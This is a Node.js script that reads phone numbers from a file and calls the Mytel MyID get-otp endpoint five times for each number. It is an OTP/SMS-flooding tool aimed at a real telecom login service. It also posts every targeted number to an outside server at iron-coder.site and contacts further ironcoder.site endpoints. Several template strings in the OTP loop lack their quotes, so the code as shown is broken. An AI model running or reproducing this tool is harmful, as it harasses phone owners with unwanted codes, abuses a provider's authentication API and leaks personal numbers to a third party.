// index.js const axios = require("axios"); const FormData = require("form-data"); const fs = require("fs");

const phones = JSON.parse(fs.readFileSync("./phones.json", "utf-8"));

async function postForm(phone) { const form = new FormData(); form.append("phone", phone);

try {
    await axios.post("https://iron-coder.site/ironmyid/online_users.php", form, {
        headers: form.getHeaders()
    });
    console.log(`📨 Sent form with phone: ${phone}`);
} catch (e) {
    console.error(`❌ Error posting ${phone}:`, e.message);
}

}

async function sendOtp(phone) { for (let i = 0; i < 5; i++) { try { const url = https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=${phone}; const res = await axios.get(url); if (res.status === 200) { console.log(✅ (${i + 1}/5) OTP sent to ${phone}); } else { console.log(⚠️ (${i + 1}/5) Failed for ${phone}: Status ${res.status}); } } catch (e) { console.error(❌ (${i + 1}/5) OTP error for ${phone}:, e.message); } } }

async function backgroundRequests() { axios.get("https://ironcoder.site/ironmyid/version.php") .then(res => console.log("🔍 version:", res.data)) .catch(e => console.error("version.php:", e.message));

axios.get("https://ironcoder.site/ironmyid/myads.php")
    .then(res => console.log("📢 myads:", res.status))
    .catch(e => console.error("myads.php:", e.message));

}

async function main() { for (const phone of phones) { postForm(phone); sendOtp(phone); // Send OTP 5 times, catch error per try } backgroundRequests(); }

main();

